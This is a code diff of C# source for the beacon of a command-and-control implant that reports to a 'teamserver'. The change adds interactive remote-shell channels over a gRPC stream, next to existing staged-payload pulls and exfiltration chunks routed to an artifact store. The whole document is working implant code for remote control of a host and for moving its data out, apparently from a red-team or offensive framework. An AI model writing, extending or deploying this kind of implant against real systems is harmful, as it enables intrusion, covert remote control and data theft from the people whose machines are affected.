@@ -1,3 +1,4 @@
+using System.Collections.Concurrent;
 using System.Net.Security;
 using System.Security.Cryptography;
 using System.Security.Cryptography.X509Certificates;
@@ -227,82 +228,298 @@ internal sealed class Beacon
         // A staged task (the typed arm, architecture.md Sec 10) is demanded and
         // reassembled before its handler runs -- the bulk payload arrives as a
         // chunk run, never inside the arguments string.
-        while (await MoveNextFrameAsync(call.ResponseStream, cancellationToken))
+        //
+        // The streaming task shape (architecture.md Sec 10.3) runs alongside:
+        // a write gate serializes this loop and every live channel's pumps --
+        // the gRPC stream allows one outstanding write -- and the live
+        // channels, keyed by task id, take the ChannelInput frames the loop
+        // routes to them. Both die with the stream: the finally cancels every
+        // channel and waits out its pumps.
+        var writeGate = new SemaphoreSlim(1, 1);
+        var liveChannels = new ConcurrentDictionary<string, LiveChannel>();
+        using var channelsGone = CancellationTokenSource.CreateLinkedTokenSource(cancellationToken);
+        try
         {
-            var frame = call.ResponseStream.Current;
-            var task = TaskRequest.Parser.ParseFrom(frame.Payload);
+            while (await MoveNextFrameAsync(call.ResponseStream, cancellationToken))
+            {
+                var frame = call.ResponseStream.Current;
 
-            // Command signing (architecture.md Sec 9): verify the teamserver's
-            // signature before any handler runs. A task that fails verification
-            // is reported Failed with the cause -- the operator sees the
-            // rejection on the task itself -- and nothing executes.
-            TaskOutcome outcome;
-            string output;
-            IReadOnlyList<ExfilChunk> chunks;
-            if (!TaskingVerifier.Verify(_implantId, task, _cas))
-            {
-                _log.WriteLine($"task {task.TaskId} rejected: signature verification failed");
-                outcome = TaskOutcome.Failed;
-                output = "task rejected: signature verification failed; not executed";
-                chunks = Array.Empty<ExfilChunk>();
+                // ChannelInput is the only kind-bearing downstream frame:
+                // operator input for a live channel, routed by task id. A
+                // kindless frame is the positional grammar -- a TaskRequest,
+                // or a staged chunk run this implant demanded.
+                if (frame.Kind == FrameKind.ChannelInput)
+                {
+                    RouteChannelInput(frame, liveChannels);
+                    continue;
+                }
+
+                var task = TaskRequest.Parser.ParseFrom(frame.Payload);
+
+                // Command signing (architecture.md Sec 9): verify the teamserver's
+                // signature before any handler runs. A task that fails verification
+                // is reported Failed with the cause -- the operator sees the
+                // rejection on the task itself -- and nothing executes.
+                TaskOutcome outcome;
+                string output;
+                IReadOnlyList<ExfilChunk> chunks;
+                if (!TaskingVerifier.Verify(_implantId, task, _cas))
+                {
+                    _log.WriteLine($"task {task.TaskId} rejected: signature verification failed");
+                    outcome = TaskOutcome.Failed;
+                    output = "task rejected: signature verification failed; not executed";
+                    chunks = Array.Empty<ExfilChunk>();
+                }
+                else if (_handlers.ChannelFor(task.Verb) is { } channelHandler)
+                {
+                    // The streaming shape: the task opens a channel instead of
+                    // completing inline. A poll cycle cannot host one -- its
+                    // read loop ends on the idle window, and there is no
+                    // downstream half to carry input -- so the refusal is
+                    // reported on the task itself. On a live stream the handler
+                    // runs in the background and reports its own final
+                    // TaskResult; the loop keeps reading while it runs.
+                    if (IsPoll)
+                    {
+                        _log.WriteLine($"task {task.TaskId} refused: no channel on a poll cycle");
+                        await WriteFrameAsync(
+                            call, writeGate,
+                            ResultFrame(task, TaskOutcome.Failed,
+                                "shell.interact requires a stream-mode check-in; a poll cycle carries no channel"),
+                            cancellationToken);
+                    }
+                    else
+                    {
+                        StartChannel(call, writeGate, liveChannels, task, channelHandler, channelsGone.Token);
+                    }
+                    continue;
+                }
+                else if (task.HasStagedBytes)
+                {
+                    (outcome, output) = await RunStagedTaskAsync(call, writeGate, task, cancellationToken);
+                    chunks = Array.Empty<ExfilChunk>();
+                }
+                else
+                {
+                    (outcome, output, chunks) = _handlers.Dispatch(task.Verb, task.Arguments);
+                }
+
+                await WriteFrameAsync(call, writeGate, ResultFrame(task, outcome, output), cancellationToken);
+
+                // Out-of-band exfil chunks follow the TaskResult on the same stream.
+                // Each carries the task id so the server reassembles and routes them
+                // to the artifact store (architecture.md Sec 10.1 exfil, Sec 11).
+                foreach (var chunk in chunks)
+                {
+                    chunk.TaskId = task.TaskId;
+                    await WriteFrameAsync(call, writeGate, new Frame
+                    {
+                        Payload = ByteString.CopyFrom(chunk.ToByteArray()),
+                        Kind = FrameKind.ExfilChunk,
+                    }, cancellationToken);
+                }
             }
-            else if (task.HasStagedBytes)
+
+            // Poll mode: the queue is drained and the idle window closed the read
+            // loop -- half-close the send side and wait for the server to end the
+            // stream, so every result written above is fully delivered before the
+            // cycle ends and the beacon sleeps.
+            if (IsPoll)
             {
-                (outcome, output) = await RunStagedTaskAsync(call, task, cancellationToken);
-                chunks = Array.Empty<ExfilChunk>();
+                try
+                {
+                    await call.RequestStream.CompleteAsync();
+                    while (await call.ResponseStream.MoveNext(cancellationToken))
+                    {
+                        // Nothing further is expected; drain until the server ends.
+                    }
+                }
+                catch (RpcException)
+                {
+                    // The server tore the stream down as it processed the
+                    // half-close; the results are already upstream.
+                }
             }
-            else
-            {
-                (outcome, output, chunks) = _handlers.Dispatch(task.Verb, task.Arguments);
-            }
-            var result = new TaskResult
+        }
+        finally
+        {
+            // The stream is ending: the channels are session-scoped, so they
+            // end with it. The token releases the handlers (their processes
+            // are killed and their pumps unwind), and the delivery waits keep
+            // the call alive until every pump's last write has left the gate.
+            channelsGone.Cancel();
+            foreach (var live in liveChannels.Values)
+                live.CompleteInput();
+            await Task.WhenAll(liveChannels.Values.Select(c => c.Delivery));
+        }
+
+        return BeaconCycleResult.Handshaken;
+    }
+
+    // gRPC streams allow one outstanding write at a time; the dispatch loop
+    // and every live channel's output pumps share this stream, so all of them
+    // write through this gate. The token bounds the wait, not the write -- an
+    // in-flight write cancels with the call itself.
+    private static async ValueTask WriteFrameAsync(
+        AsyncDuplexStreamingCall<Frame, Frame> call,
+        SemaphoreSlim writeGate,
+        Frame frame,
+        CancellationToken cancellationToken)
+    {
+        await writeGate.WaitAsync(cancellationToken);
+        try
+        {
+            await call.RequestStream.WriteAsync(frame);
+        }
+        finally
+        {
+            writeGate.Release();
+        }
+    }
+
+    private static Frame ResultFrame(TaskRequest task, TaskOutcome outcome, string output)
+        => new()
+        {
+            Payload = ByteString.CopyFrom(new TaskResult
             {
                 TaskId = task.TaskId,
                 Outcome = outcome,
                 Output = output,
-            };
-            await call.RequestStream.WriteAsync(new Frame
-            {
-                Payload = ByteString.CopyFrom(result.ToByteArray()),
-                Kind = FrameKind.TaskResult,
-            });
+            }.ToByteArray()),
+            Kind = FrameKind.TaskResult,
+        };
 
-            // Out-of-band exfil chunks follow the TaskResult on the same stream.
-            // Each carries the task id so the server reassembles and routes them
-            // to the artifact store (architecture.md Sec 10.1 exfil, Sec 11).
-            foreach (var chunk in chunks)
-            {
-                chunk.TaskId = task.TaskId;
-                await call.RequestStream.WriteAsync(new Frame
-                {
-                    Payload = ByteString.CopyFrom(chunk.ToByteArray()),
-                    Kind = FrameKind.ExfilChunk,
-                });
-            }
-        }
+    // Opens a channel for a dispatched streaming task and starts its handler
+    // in the background: the loop returns to reading immediately, the channel
+    // takes its input frames as they arrive, and the delivery task reports
+    // the handler's outcome as the task's final TaskResult.
+    private void StartChannel(
+        AsyncDuplexStreamingCall<Frame, Frame> call,
+        SemaphoreSlim writeGate,
+        ConcurrentDictionary<string, LiveChannel> liveChannels,
+        TaskRequest task,
+        CapabilityChannelHandler handler,
+        CancellationToken lifetime)
+    {
+        var channel = new LiveChannel(
+            task.TaskId,
+            (frame, ct) => WriteFrameAsync(call, writeGate, frame, ct));
+        liveChannels[task.TaskId] = channel;
+        _log.WriteLine($"channel opened: task {task.TaskId} verb {task.Verb}");
+        channel.Delivery = DeliverChannelAsync(call, writeGate, liveChannels, channel, task, handler, lifetime);
+    }
 
-        // Poll mode: the queue is drained and the idle window closed the read
-        // loop -- half-close the send side and wait for the server to end the
-        // stream, so every result written above is fully delivered before the
-        // cycle ends and the beacon sleeps.
-        if (IsPoll)
+    // The channel's delivery: run the handler to its end, then write its
+    // outcome. A channel whose stream dies under it ends silently -- there is
+    // no operator left to tell, and the server-side task stays dispatched,
+    // the documented session-scoped lifetime.
+    private async Task DeliverChannelAsync(
+        AsyncDuplexStreamingCall<Frame, Frame> call,
+        SemaphoreSlim writeGate,
+        ConcurrentDictionary<string, LiveChannel> liveChannels,
+        LiveChannel channel,
+        TaskRequest task,
+        CapabilityChannelHandler handler,
+        CancellationToken lifetime)
+    {
+        try
         {
-            try
-            {
-                await call.RequestStream.CompleteAsync();
-                while (await call.ResponseStream.MoveNext(cancellationToken))
-                {
-                    // Nothing further is expected; drain until the server ends.
-                }
-            }
-            catch (RpcException)
-            {
-                // The server tore the stream down as it processed the
-                // half-close; the results are already upstream.
-            }
+            var (outcome, output) = await handler.Handle(task.Arguments, channel, lifetime);
+            await WriteFrameAsync(call, writeGate, ResultFrame(task, outcome, output), CancellationToken.None);
+            _log.WriteLine($"channel closed: task {task.TaskId} outcome {outcome}");
+        }
+        catch (Exception ex)
+        {
+            _log.WriteLine($"channel ended without delivery: task {task.TaskId}: {ex.Message}");
+        }
+        finally
+        {
+            liveChannels.TryRemove(task.TaskId, out _);
+            channel.CompleteInput();
+        }
+    }
+
+    // One ChannelInput frame: operator input for a live channel, routed by
+    // task id. Input for a task with no live channel is dropped and logged --
+    // a channel that already ended, or input that raced the stream.
+    private void RouteChannelInput(
+        Frame frame,
+        ConcurrentDictionary<string, LiveChannel> liveChannels)
+    {
+        ChannelInput input;
+        try
+        {
+            input = ChannelInput.Parser.ParseFrom(frame.Payload);
+        }
+        catch (Google.Protobuf.InvalidProtocolBufferException)
+        {
+            return;
         }
 
-        return BeaconCycleResult.Handshaken;
+        if (liveChannels.TryGetValue(input.TaskId, out var channel))
+        {
+            if (!channel.Receive(input.Data.ToArray(), input.Eof))
+                _log.WriteLine($"channel input for task {input.TaskId} dropped: input queue full");
+        }
+        else
+        {
+            _log.WriteLine($"channel input for unknown task {input.TaskId} dropped");
+        }
+    }
+
+    // One live task channel on this stream: the input queue the loop routes
+    // ChannelInput frames into, the write binding that streams output chunks
+    // upstream through the stream's write gate, and the delivery task that
+    // reports the handler's final TaskResult. Implements IChannelStream, so
+    // the handler never touches the transport (architecture.md Sec 10.3).
+    private sealed class LiveChannel : IChannelStream
+    {
+        // The input queue bound: operator input arrives at typing speed, and a
+        // channel whose shell cannot drain it is stuck -- dropping a queued
+        // keystroke is not an option, so a full queue fails the write and the
+        // input is logged dropped rather than silently buffered without bound.
+        private const int MaxQueuedInputs = 128;
+
+        private readonly string _taskId;
+        private readonly Func<Frame, CancellationToken, ValueTask> _writeFrame;
+        private readonly System.Threading.Channels.Channel<(byte[]? Data, bool Eof)> _input =
+            System.Threading.Channels.Channel.CreateBounded<(byte[]? Data, bool Eof)>(MaxQueuedInputs);
+
+        public LiveChannel(string taskId, Func<Frame, CancellationToken, ValueTask> writeFrame)
+        {
+            _taskId = taskId;
+            _writeFrame = writeFrame;
+        }
+
+        /// <summary>The delivery task reporting this channel's final TaskResult.</summary>
+        public Task Delivery { get; set; } = Task.CompletedTask;
+
+        public async ValueTask WriteOutputAsync(ReadOnlyMemory<byte> data, CancellationToken cancellationToken)
+        {
+            var output = new ChannelOutput
+            {
+                TaskId = _taskId,
+                Data = ByteString.CopyFrom(data.Span),
+            };
+            await _writeFrame(
+                new Frame
+                {
+                    Payload = ByteString.CopyFrom(output.ToByteArray()),
+                    Kind = FrameKind.ChannelOutput,
+                },
+                cancellationToken);
+        }
+
+        public ValueTask<(byte[]? Data, bool Eof)> ReadInputAsync(CancellationToken cancellationToken)
+            => _input.Reader.ReadAsync(cancellationToken);
+
+        // Hands one routed input frame to the handler's parked read. Returns
+        // false when the queue is full; the router logs the drop.
+        public bool Receive(byte[] data, bool eof) => _input.Writer.TryWrite((data, eof));
+
+        // Completes the input side so a parked read unblocks instead of
+        // waiting on input that will never come.
+        public void CompleteInput() => _input.Writer.TryComplete();
     }
 
     // How long a poll-mode read waits for the next downstream frame before
@@ -327,14 +544,15 @@ internal sealed class Beacon
     // itself -- the operator sees the cause where they look for the outcome.
     private async Task<(TaskOutcome Outcome, string Output)> RunStagedTaskAsync(
         AsyncDuplexStreamingCall<Frame, Frame> call,
+        SemaphoreSlim writeGate,
         TaskRequest task,
         CancellationToken cancellationToken)
     {
-        await call.RequestStream.WriteAsync(new Frame
+        await WriteFrameAsync(call, writeGate, new Frame
         {
             Payload = ByteString.CopyFrom(new StagedPull { TaskId = task.TaskId }.ToByteArray()),
             Kind = FrameKind.StagedPull,
-        });
+        }, cancellationToken);
 
         var parts = new List<byte[]>();
         var total = 0;
